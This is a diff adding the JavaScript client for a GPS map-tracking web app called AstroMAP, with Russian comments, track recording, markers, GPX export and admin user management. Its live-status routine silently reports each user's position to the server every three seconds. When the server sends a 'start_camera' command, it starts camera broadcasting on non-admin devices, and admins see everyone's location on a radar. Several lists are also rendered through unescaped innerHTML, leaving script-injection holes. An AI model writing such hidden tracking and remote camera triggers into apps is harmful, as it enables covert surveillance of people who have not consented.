@@ -1,0 +1,395 @@
+// Глобальные переменные
+let map, userMarker, watchId = null, trackPoints = [], polyline = null;
+let startMarker = null, endMarker = null;
+let isSimulating = false, simInterval = null, startTime = null;
+let trackingStartTime = null;
+let lastGpsTime = 0;
+let lastHeading = 0;
+let otherUsersMarkers = {}; 
+const deviceId = Math.random().toString(36).substring(7);
+let currentUser = null;
+
+// --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---
+
+function formatTime(seconds) {
+    const h = Math.floor(seconds / 3600);
+    const m = Math.floor((seconds % 3600) / 60);
+    const s = seconds % 60;
+    return [h, m, s].map(v => v < 10 ? "0" + v : v).join(":");
+}
+
+function showTab(tabId) {
+    document.querySelectorAll('.tab-content').forEach(c => c.style.display = 'none');
+    document.querySelectorAll('.nav-tabs button').forEach(b => b.classList.remove('active'));
+    
+    const targetTab = document.getElementById('tab-' + tabId);
+    const targetBtn = document.getElementById('tab-btn-' + tabId);
+    
+    if (targetTab) targetTab.style.display = 'block';
+    if (targetBtn) targetBtn.classList.add('active');
+
+    if (tabId === 'history') renderHistory();
+    if (tabId === 'markers') renderMarkers();
+    if (tabId === 'admin-users') renderAdminUsers();
+}
+
+// --- GPS И ТРЕКИНГ ---
+
+function toggleTracking() {
+    const isTest = document.getElementById('test-mode').checked;
+    const btn = document.getElementById('start-gps');
+
+    if (watchId || isSimulating) {
+        stopTracking();
+        btn.innerText = '🛰️ Начать отслеживание';
+        btn.style.background = '';
+    } else {
+        trackPoints = [];
+        if (polyline) map.removeLayer(polyline);
+        polyline = L.polyline([], {color: '#00d4ff', weight: 5, opacity: 0.8}).addTo(map);
+        
+        if (isTest) {
+            startSimulation();
+        } else {
+            startRealTracking();
+        }
+        trackingStartTime = Date.now();
+        btn.innerText = '🛑 Остановить тест';
+        btn.style.background = 'linear-gradient(45deg, #ef4444, #7f1d1d)';
+    }
+    updateHUD();
+}
+
+function stopTracking() {
+    if (watchId) navigator.geolocation.clearWatch(watchId);
+    if (simInterval) clearInterval(simInterval);
+    watchId = null;
+    isSimulating = false;
+    
+    if (trackPoints.length > 1) {
+        saveTrack(trackPoints);
+    }
+}
+
+function startSimulation() {
+    isSimulating = true;
+    let lat = 55.7558, lng = 37.6173;
+    simInterval = setInterval(() => {
+        lat += (Math.random() - 0.5) * 0.001;
+        lng += (Math.random() - 0.5) * 0.001;
+        updatePosition({ 
+            coords: { 
+                latitude: lat, 
+                longitude: lng, 
+                heading: Math.random() * 360, 
+                speed: Math.random() * 15 
+            },
+            timestamp: Date.now()
+        });
+    }, 1000);
+}
+
+function startRealTracking() {
+    if (!navigator.geolocation) return alert("GPS не поддерживается");
+    watchId = navigator.geolocation.watchPosition(updatePosition, (err) => console.error(err), {
+        enableHighAccuracy: true
+    });
+}
+
+function updatePosition(pos) {
+    const { latitude, longitude, heading, speed } = pos.coords;
+    const latlng = [latitude, longitude];
+
+    if (!userMarker) {
+        userMarker = L.marker(latlng).addTo(map);
+        map.setView(latlng, 15);
+    } else {
+        userMarker.setLatLng(latlng);
+    }
+
+    trackPoints.push({ lat: latitude, lng: longitude, time: pos.timestamp });
+    if (polyline) polyline.addLatLng(latlng);
+
+    if (heading != null) {
+        lastHeading = heading;
+        const arrow = document.getElementById('compass-arrow');
+        if (arrow) arrow.style.transform = `translate(-50%, -50%) rotate(${heading}deg)`;
+    }
+    
+    updateHUD(speed);
+}
+
+// --- МЕТКИ ---
+
+function saveManualMarker() {
+    const name = document.getElementById('marker-name').value || "Метка";
+    const pos = userMarker ? userMarker.getLatLng() : map.getCenter();
+    
+    const markerData = {
+        id: Date.now(),
+        name: name,
+        lat: pos.lat,
+        lng: pos.lng,
+        time: new Date().toISOString()
+    };
+
+    let markers = JSON.parse(localStorage.getItem('astro_markers') || '[]');
+    markers.push(markerData);
+    localStorage.setItem('astro_markers', JSON.stringify(markers));
+    
+    L.marker([pos.lat, pos.lng]).addTo(map).bindPopup(name);
+    alert("Метка сохранена");
+    document.getElementById('manual-coords').style.display = 'none';
+    renderMarkers();
+}
+
+function renderMarkers() {
+    const markers = JSON.parse(localStorage.getItem('astro_markers') || '[]');
+    const list = document.getElementById('markers-list');
+    if (!list) return;
+    list.innerHTML = markers.length ? markers.map(m => `
+        <div class="section" style="font-size: 11px;">
+            <div>📍 ${m.name}</div>
+            <div style="color:#94a3b8; font-size:9px;">${m.lat.toFixed(4)}, ${m.lng.toFixed(4)}</div>
+            <button onclick="deleteMarker(${m.id})" style="margin-top:5px; background:#ef4444; padding:2px;">Удалить</button>
+        </div>
+    `).join('') : '<p style="text-align:center; color:#94a3b8;">Меток нет</p>';
+}
+
+function deleteMarker(id) {
+    let markers = JSON.parse(localStorage.getItem('astro_markers') || '[]');
+    markers = markers.filter(m => m.id !== id);
+    localStorage.setItem('astro_markers', JSON.stringify(markers));
+    renderMarkers();
+}
+
+// --- ЭКСПОРТ И ИСТОРИЯ ---
+
+function saveTrack(points) {
+    const track = {
+        id: Date.now(),
+        date: new Date().toLocaleString(),
+        points: points
+    };
+    let history = JSON.parse(localStorage.getItem('astro_history') || '[]');
+    history.push(track);
+    localStorage.setItem('astro_history', JSON.stringify(history));
+}
+
+function renderHistory() {
+    const history = JSON.parse(localStorage.getItem('astro_history') || '[]');
+    const list = document.getElementById('history-list');
+    if (!list) return;
+    list.innerHTML = history.length ? history.map(t => `
+        <div class="section" style="font-size: 11px;">
+            <div>📅 ${t.date}</div>
+            <div>Точек: ${t.points.length}</div>
+            <button onclick="exportGPX(${t.id})" style="margin-top:5px; background:#10b981;">GPX</button>
+        </div>
+    `).join('') : '<p style="text-align:center; color:#94a3b8;">История пуста</p>';
+}
+
+function exportGPX(trackId) {
+    const history = JSON.parse(localStorage.getItem('astro_history') || '[]');
+    const track = history.find(t => t.id === trackId);
+    if (!track) return;
+
+    let gpx = `<?xml version="1.0" encoding="UTF-8"?>
+<gpx version="1.1" creator="AstroMAP">
+  <trk><name>Track ${track.date}</name><trkseg>`;
+    
+    track.points.forEach(p => {
+        gpx += `<trkpt lat="${p.lat}" lon="${p.lng}"><time>${new Date(p.time).toISOString()}</time></trkpt>`;
+    });
+    
+    gpx += `</trkseg></trk></gpx>`;
+    
+    const blob = new Blob([gpx], { type: 'application/gpx+xml' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `track_${trackId}.gpx`;
+    a.click();
+}
+
+// --- СИСТЕМА СИГНАЛОВ И КАМЕРА ---
+
+async function updateLiveStatus() {
+    const currentPos = userMarker ? userMarker.getLatLng() : null;
+    try {
+        const response = await fetch('/api/live', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                deviceId: deviceId,
+                lat: currentPos ? currentPos.lat : null,
+                lng: currentPos ? currentPos.lng : null,
+                heading: lastHeading,
+                name: currentUser?.login || 'Гость'
+            })
+        });
+        
+        const data = await response.json();
+        
+        if (currentUser?.role !== 'admin' && data.command === 'start_camera') {
+            startBroadcasting();
+        }
+
+        if (currentUser?.role === 'admin' && data.users) {
+            updateAdminRadar(data.users);
+        }
+    } catch (e) { console.error(e); }
+}
+
+function updateAdminRadar(users) {
+    Object.keys(users).forEach(id => {
+        if (id === deviceId) return;
+        const u = users[id];
+        if (u && u.lat && u.lng) {
+            if (otherUsersMarkers[id]) {
+                otherUsersMarkers[id].setLatLng([u.lat, u.lng]);
+            } else {
+                otherUsersMarkers[id] = L.marker([u.lat, u.lng], {
+                    icon: L.divIcon({
+                        className: 'custom-marker',
+                        html: `<div style="color:#ef4444; font-weight:bold; text-shadow:0 0 5px black;">${u.name}</div>`
+                    })
+                }).addTo(map);
+            }
+        }
+    });
+}
+
+// --- ИНИЦИАЛИЗАЦИЯ ---
+
+function updateHUD(speed = 0) {
+    const hudStatus = document.getElementById('hud-gps-status');
+    const hudSats = document.getElementById('hud-satellites');
+    const hudTime = document.getElementById('hud-time');
+
+    if (hudStatus) {
+        hudStatus.innerText = (watchId || isSimulating) ? 'ACTIVE' : 'OFF';
+        hudStatus.style.color = (watchId || isSimulating) ? '#10b981' : '#ef4444';
+    }
+    if (hudSats) {
+        hudSats.innerText = isSimulating ? 'SIM' : (watchId ? 'FIX' : '0');
+    }
+    if (hudTime) {
+        hudTime.innerText = new Date().toLocaleTimeString();
+    }
+}
+
+function toggleTheme() {
+    document.body.classList.toggle('dark-mode');
+    const isDark = document.body.classList.contains('dark-mode');
+    document.getElementById('map').style.filter = isDark ? 'invert(100%) hue-rotate(180deg) brightness(95%)' : 'none';
+}
+
+async function renderAdminUsers() {
+    const res = await fetch('/api/admin/users');
+    const users = await res.json();
+    const list = document.getElementById('admin-users-list');
+    if (!list) return;
+    list.innerHTML = users.map(u => `
+        <div class="section" style="display: flex; justify-content: space-between; align-items: center; font-size: 11px;">
+            <span>${u.login} (${u.role})</span>
+            <button onclick="deleteUser('${u.login}')" style="width: auto; padding: 2px 8px; margin: 0; background: #ef4444;">X</button>
+        </div>
+    `).join('');
+}
+
+async function deleteUser(login) {
+    if (!confirm(`Удалить ${login}?`)) return;
+    await fetch('/api/admin/delete-user', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ login })
+    });
+    renderAdminUsers();
+}
+
+document.addEventListener('DOMContentLoaded', async () => {
+    map = L.map('map', { zoomControl: false }).setView([55.7558, 37.6173], 13);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+    
+    setTimeout(() => map.invalidateSize(), 500);
+    window.addEventListener('resize', () => map.invalidateSize());
+
+    // Привязка кнопок
+    const startGpsBtn = document.getElementById('start-gps');
+    if (startGpsBtn) startGpsBtn.onclick = toggleTracking;
+
+    const themeToggleBtn = document.getElementById('theme-toggle');
+    if (themeToggleBtn) themeToggleBtn.onclick = toggleTheme;
+
+    const addMarkerBtn = document.getElementById('add-marker');
+    if (addMarkerBtn) addMarkerBtn.onclick = () => {
+        showTab('markers');
+        const modal = document.getElementById('marker-modal');
+        if (modal) modal.style.display = 'block';
+    };
+
+    const btnCurrentPos = document.getElementById('btn-current-pos');
+    if (btnCurrentPos) btnCurrentPos.onclick = () => {
+        const manualCoords = document.getElementById('manual-coords');
+        if (manualCoords) manualCoords.style.display = 'block';
+    };
+
+    const btnSaveMarker = document.getElementById('btn-save-marker');
+    if (btnSaveMarker) btnSaveMarker.onclick = saveManualMarker;
+
+    const btnCancelMarker = document.getElementById('btn-cancel-marker');
+    if (btnCancelMarker) btnCancelMarker.onclick = () => {
+        const modal = document.getElementById('marker-modal');
+        if (modal) modal.style.display = 'none';
+    };
+
+    const btnCreateUser = document.getElementById('btn-create-user');
+    if (btnCreateUser) {
+        btnCreateUser.onclick = async () => {
+            const login = document.getElementById('new-user-login').value;
+            const pass = document.getElementById('new-user-pass').value;
+            const res = await fetch('/api/admin/create-user', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ login, password: pass })
+            });
+            if ((await res.json()).success) {
+                alert("Создан");
+                renderAdminUsers();
+            }
+        };
+    }
+
+    const exportDataBtn = document.getElementById('export-data');
+    if (exportDataBtn) exportDataBtn.onclick = () => {
+        const history = localStorage.getItem('astro_history') || '[]';
+        const markers = localStorage.getItem('astro_markers') || '[]';
+        const data = JSON.stringify({ history: JSON.parse(history), markers: JSON.parse(markers) }, null, 2);
+        const blob = new Blob([data], { type: 'application/json' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'astromap_data.json';
+        a.click();
+    };
+
+    const logoutBtn = document.getElementById('logout-btn');
+    if (logoutBtn) logoutBtn.onclick = () => {
+        localStorage.removeItem('astro_user');
+        window.location.href = 'login.html';
+    };
+
+    // Проверка пользователя
+    try {
+        const userRes = await fetch('/api/user/me');
+        currentUser = await userRes.json();
+        if (currentUser && currentUser.role === 'admin') {
+            const adminTabBtn = document.getElementById('tab-btn-admin-users');
+            if (adminTabBtn) adminTabBtn.style.display = 'block';
+        }
+    } catch (e) { console.error("Auth check failed", e); }
+
+    setInterval(updateHUD, 1000);
+    setInterval(updateLiveStatus, 3000);
+});
